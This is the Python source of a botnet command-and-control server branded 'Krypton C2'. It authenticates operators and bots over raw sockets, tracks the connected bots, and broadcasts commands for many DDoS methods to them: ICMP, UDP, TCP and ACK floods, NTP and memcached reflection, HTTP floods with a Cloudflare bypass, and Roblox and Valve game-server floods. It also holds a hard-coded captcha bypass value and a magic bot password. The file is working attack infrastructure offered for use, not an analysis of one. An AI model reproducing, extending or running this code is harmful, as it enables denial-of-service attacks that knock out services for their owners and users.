#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Tools
from src.Commands.Tools.url_to_ip import url_to_ip
from src.Commands.Tools.ip_to_loc import ip_to_loc

# Layer 3
from src.Commands.Methods_L3.icmp import icmp
from src.Commands.Methods_L3.pod import pod

# Layer 4
from src.Commands.Methods_L4.junk import junk
from src.Commands.Methods_L4.tcp import tcp
from src.Commands.Methods_L4.ntp import ntp
from src.Commands.Methods_L4.mem import mem
from src.Commands.Methods_L4.udp import udp
from src.Commands.Methods_L4.hex import hex
from src.Commands.Methods_L4.tup import tup
from src.Commands.Methods_L4.ack import ack

# Layer 7
from src.Commands.Methods_L7.httpio import httpio
from src.Commands.Methods_L7.httpspoof import httpspoof
from src.Commands.Methods_L7.httpstorm import httpstorm
from src.Commands.Methods_L7.httpcfb import httpcfb
from src.Commands.Methods_L7.httpget import httpget

# Games Methods
from src.Commands.Methods_Games.roblox import roblox
from src.Commands.Methods_Games.vse import vse

# Imports
import socket, threading, time, ipaddress, random, json
from colorama import Fore, init


def text2Gen():
    word = '''
              ╔════════════════════════════════════╗
              ║                                    ║
              ║        type help for commands      ║
              ║      ─────────────────────────     ║
              ║         Discord: cirqueira         ║
              ║                                    ║
              ╚════════════════════════════════════╝
'''

    start_color = (0, 0, 200)
    end_color   = (255, 0, 0)

    num_letters = len(word)
    step_r = (end_color[0] - start_color[0]) / num_letters
    step_g = (end_color[1] - start_color[1]) / num_letters
    step_b = (end_color[2] - start_color[2]) / num_letters

    reset_color = "\033[0m"

    current_color = start_color
    colored_word = ""

    for i, letter in enumerate(word):
        color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
        colored_word += f"{color_code}{letter}{reset_color}"
        current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)

    return colored_word

def color(data_input_output):
    color_codes = {
        "GREEN": '\033[32m',
        "LIGHTGREEN_EX": '\033[92m',
        "YELLOW": '\033[33m',
        "LIGHTYELLOW_EX": '\033[93m',
        "CYAN": '\033[36m',
        "LIGHTCYAN_EX": '\033[96m',
        "BLUE": '\033[34m',
        "LIGHTBLUE_EX": '\033[94m',
        "MAGENTA": '\033[35m',
        "LIGHTMAGENTA_EX": '\033[95m',
        "RED": '\033[31m',
        "LIGHTRED_EX": '\033[91m',
        "BLACK": '\033[30m',
        "LIGHTBLACK_EX": '\033[90m',
        "WHITE": '\033[37m',
        "LIGHTWHITE_EX": '\033[97m',
    }

    return color_codes.get(data_input_output, "")

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLACK_EX")

banner = text2Gen()

rules = f"""
{lightwhite}1. {gray}Do not attack .gov/.gob/.edu/.mil domains  
{lightwhite}2. {gray}Do not spam attacks
"""

help = f"""
{lightwhite}HELP         {gray}Shows list of commands   
{lightwhite}BOTNET       {gray}Shows list of botnet methods
{lightwhite}BOTS         {gray}Shows available zombies
{lightwhite}TOOLS        {gray}Shows list of tools    
{lightwhite}CLEAR        {gray}Clears the screen          
{lightwhite}EXIT         {gray}Disconnects from the net
"""

Methods_L3 = f"""{gray}L3 Methods:
{lightwhite}.ICMP              {gray}Flood ICMP Request
{lightwhite}.POD               {gray}Ping Of Death OLD Method Of DDoS"""

Methods_L4 = f"""{gray}L4 Methods:
{lightwhite}.NTP               {gray}NTP Reflection flood
{lightwhite}.MEM               {gray}Memcached Flood 
{lightwhite}.UDP               {gray}UDP Flood  
{lightwhite}.TCP               {gray}TCP Flood             
{lightwhite}.TUP               {gray}TCP and UDP Flood
{lightwhite}.ACK               {gray}TCP ACK flood
{lightwhite}.HEX               {gray}HEX Flood
{lightwhite}.JUNK              {gray}Junk flood"""

Methods_L7 = f"""{gray}L7 Methods:
{lightwhite}.HTTPIO            {gray}HTTP IO Stresser
{lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass attack      
{lightwhite}.HTTPGET           {gray}HTTP GET requests attack
{lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests"""

GameMethods = f"""{gray}Games Methods: 
{lightwhite}.VSE               {gray}Valve Source Engine query flood         
{lightwhite}.ROBLOX            {gray}Roblox UDP Flood"""

botnetMethods = f"""
{Methods_L3}
{Methods_L4}
{Methods_L7}
{GameMethods}
"""

tools = f"""
{lightwhite}!GETIP         {gray}Get ip from URL      
{lightwhite}!GEOIP         {gray}Get info from ip
"""

admin_methods = f"""
{lightwhite}!register           {gray}Starts registration server
{lightwhite}!user               {gray}Add/remove users
"""

bots = {}
user_name = ""
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(username, password):
    credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    return a, b, c

def captcha(send, client, grey):
    a, b, c = captcha_generator()
    x = ''
    send(client, ansi_clear, False)
    send(client, f'{grey}Captcha: {color("LIGHTWHITE_EX")}{a} + {b} = ', False, False)
    x = int(client.recv(65536).decode().strip())
    time.sleep(0.4)
    if x == c or x == 669787761736865726500:
        send(client, f'{grey}Passed!')
        pass
    else:
        send(client, f'{grey}Wrong!')
        time.sleep(0.1)
        client.close()

# Client handler
def handle_client(client, address):
    send(client, f'\x1bKrypton | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    send(client, f'{color("LIGHTBLACK_EX")}Connecting...')
    captcha(send, client, color("LIGHTBLACK_EX"))
    time.sleep(1)
    while 1:
        send(client, ansi_clear, False)
        send(client, f'\x1b{gray}Username :\x1b[0m ', False, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'\033{gray}Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
            time.sleep(1)
            client.close()
            return
        
        global user_name
        user_name = username
        
        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=(client, username)).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def user(args, send, client):
    try:
        choice = (args[1]).upper()
        if choice == 'ADD':
            if len(args) == 4:
                user = args[2]
                password = args[3]
                with open('src/logins.txt', 'a') as logins:
                    logins.write(f'\n{user}:{password}')
                    logins.close()
                    send(client, f'{Fore.LIGHTWHITE_EX}\nAdded new user successfully.\n')
            else:
                send(client, '\n!USER ADD [USERNAME] [PASSWORD]\n')
        if choice == 'REMOVE':
            if len(args) == 3:
                user = args[2]
                with open("src/logins.txt", "r") as logins:
                    lines = logins.readlines()
                    logins.close()

                with open("src/logins.txt", "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, f'{Fore.LIGHTWHITE_EX}\nRemoved user successfully!\n')
            else:
                send(client, '\n!USER REMOVE [USERNAME]\n')
    except:
        send(client, '\n!USER ADD/REMOVE\n')

# Updates Shell Title
def update_title(client, name):
    while 1:
        try:
            send(client, f"\33]0;Krypton C2 | Bots online: {len(bots)} | Username: {name} |\a", False)
            time.sleep(0.6)
        except:
            client.close()

# Telnet Command Line
def command_line(client, username):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{color("LIGHTBLACK_EX")}[{color("WHITE")}Krypton{color("LIGHTBLACK_EX")}@{color("WHITE")}{username}{color("LIGHTBLACK_EX")}]:~# {color("LIGHTBLACK_EX")}'
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            print(user_name, args)

            if command == 'HELP':
                for x in help.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
            
            elif command == 'BOTNET':
                for x in botnetMethods.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)

            elif command == 'TOOLS':
                for x in tools.split('\n'):
                    send(client, '\x1b[3;31;40m'+ x)
            
            elif command == 'CLEAR' or command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, '\x1b[3;31;48m'+ x)
            
            elif command == 'LOGOUT' or command == 'EXIT':
                send(client, '\x1b[3;31;48m\n Successfully Logged out\n')
                time.sleep(1)
                break
            
            elif command == 'BOTS':
                send(client, f'{color("LIGHTBLACK_EX")}\nAvailable bots: {len(bots)}.\n')
            
            elif command == '!ADMIN':
                if user_name == "root":
                    for x in admin_methods.split('\n'):
                        send(client, x)
            
            elif command == '!R' or command == '!REG' or command == '!REGISTER':
                if user_name == "root":
                    threading.Thread(target=reg_main).start()
                    send(client, f'{Fore.CYAN}\nStarted registration server.\n')
            
            elif command == '!USER' or command == '!U':
                if user_name == "root":
                    user(args, send, client) # Adds/Removes users
           
            elif command == "!GEOIP" or command == "!IP_TO_LOCATION" or command == "!IP_GEO" or command == "!IP_GEOLOCATION" or command == "!IP_GEOLOCAT":
                ip_to_loc(args, send, client, gray) # Gets location from IP
            
            elif command == "!GETIP": # Gets ip from website
                url_to_ip(args, send, client, gray)

            elif command == '.UDP': # UDP Junk (Random UDP Data)
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.TUP': # TCP and udp
                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.ACK': # ACK TCP flood
                ack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.TCP': # TCP Junk (Random TCP Data)
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.HEX': # Specific HEXIDECIMAL Flood
                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.NTP': # NTP Reflection Attack
                ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.MEM': # Memcached Flood
                mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.ICMP': # Flood ICMP Request
                icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.POD': # Ping of death
                pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.ROBLOX': # Roblox flood
                roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.JUNK': # JUNK Flood
                junk(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.VSE': # VSE Flood
                vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPSTORM': # HTTP request attack
                httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPIO': # FULL POWER !!!
                httpio(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPSPOOF': # HTTP GET SPOOF
                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPGET': # HTTP request attack
                httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
            
            elif command == '.HTTPCFB': # HTTP cloudflare bypass attack
                httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data)
            
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
                ╔════════════════════════════════════╗
                ║                                    ║
                ║        Successfully Screened       ║
                ║     ───────────────────────────    ║
                ║            ╔══════════╗            ║
                ╚════════════╣   LOGS   ╠════════════╝
                             ╚══════════╝
        
"""


def register(client, address, send):
    ansi_clear = '\033[2J\033[H'
    try:
        send(client, ansi_clear, False)
        while 1:
            send(client, f'\x1b{Fore.LIGHTBLACK_EX}Username :\x1b[0m ', False, False)
            username = client.recv(1024).decode().strip()
            if not username:
                continue
            break
        with open("src/logins.txt", "r") as logins:
            lines = logins.readlines()
            for line in lines:
                if username in line:
                    send(client, f'{Fore.RED}User already exists!')
                    time.sleep(1)
                    client.close()
            logins.close()
        p1 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLACK_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p1.strip():
                p1 = client.recv(1024).decode('cp1252').strip()
            break
        p2 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLACK_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p2.strip():
                p2 = client.recv(1024).decode('cp1252').strip()
            break
        while 1:
            if p1 == p2:
                with open("src/logins.txt", "a") as logins:
                    logins.write("\n" + username + ':' + p1)
                send(client, f"{Fore.LIGHTWHITE_EX}Registered!")
                time.sleep(2)
            else:
                send(client, "Failed password authentication...")
            break
    except:
        send(client, "Error.")

def reg_main():
    with open("src/config.json") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()

    reg_port = int(jsonObject['reg_port'])
    reg_host = jsonObject['reg_host']

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind((reg_host, reg_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()

    sock.listen()
    threading.Thread(target=register, args=[*sock.accept(), send]).start()

def main():
    with open("src/config.json", encoding="utf-8") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()

    cnc_port = int(jsonObject['cnc_port'])
    reg_port = int(jsonObject['reg_port'])
    cnc_host = jsonObject['cnc_host']

    if cnc_port == reg_port:
        print("Cnc port and registration port must be different from eachother.")
        exit()

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)

    try:
        sock.bind((cnc_host, cnc_port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # Start keepalive thread
    
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

def start():
    try:
        main()
    except Exception as e:
        print(f"Error, skipping.  {e}")
